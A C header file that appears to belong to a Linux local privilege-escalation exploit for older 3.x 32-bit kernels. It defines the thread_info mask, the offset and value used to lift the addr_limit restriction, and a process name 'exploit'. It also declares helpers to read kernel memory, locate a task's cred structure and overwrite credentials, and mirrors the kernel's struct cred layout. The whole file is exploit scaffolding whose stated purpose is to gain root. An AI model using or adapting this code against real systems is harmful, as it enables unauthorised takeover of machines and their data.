#ifndef KERNEL_H
#define KERNEL_H

#include <stdint.h>
#include <stddef.h>
#include <sys/types.h>

// ---- Constants ----

#define THREAD_SIZE          8192UL                   // 2-page kernel stack
#define THREAD_INFO_MASK     (~(THREAD_SIZE - 1))     // 0xffffe000
#define ADDR_LIMIT_OFFSET    8                        // offset of addr_limit in thread_info
#define ADDR_LIMIT_KERNEL    0xffffffffu              // value we write to lift the limit

#define TASK_COMM_LEN        16
#define OUR_COMM             "exploit"                // must match the binary's name

// ---- Helper prototypes (defined in kernel.c) ----
int   kernel_memcpy(void *src, void *dst, size_t len);
void *read_ptr(void *addr);
struct cred *find_cred(void *task);
int   overwrite_creds(struct cred *kcred);

// ---- Capabilities ----

typedef struct {
    uint32_t cap[2];
} kernel_cap_t;

// ---- Kernel structures ----

// Matches the kernel's struct cred (3.x era). Copy the full struct when
// writing back, so the size and layout must match exactly.
struct cred {
    int          usage;          // atomic_t
    uid_t        uid;
    gid_t        gid;
    uid_t        suid;
    gid_t        sgid;
    uid_t        euid;
    gid_t        egid;
    uid_t        fsuid;
    gid_t        fsgid;
    unsigned int securebits;
    kernel_cap_t cap_inheritable;
    kernel_cap_t cap_permitted;
    kernel_cap_t cap_effective;
    kernel_cap_t cap_bset;
    // Newer kernels add more fields (cap_ambient, user_ns, group_info, ...).
    // Check your kernel's include/linux/cred.h before relying on this size.
};

// Only the leading fields are needed. The rest of thread_info is omitted,
// so offsets up to 'task' must match the target.
struct thread_info {
    unsigned long flags;
    int           preempt_count;
    unsigned long addr_limit;     // mm_segment_t; ADDR_LIMIT_OFFSET should equal its offset
    struct task_struct *task;     // opaque here: only the pointer is used, never its fields
    // ...
};

#endif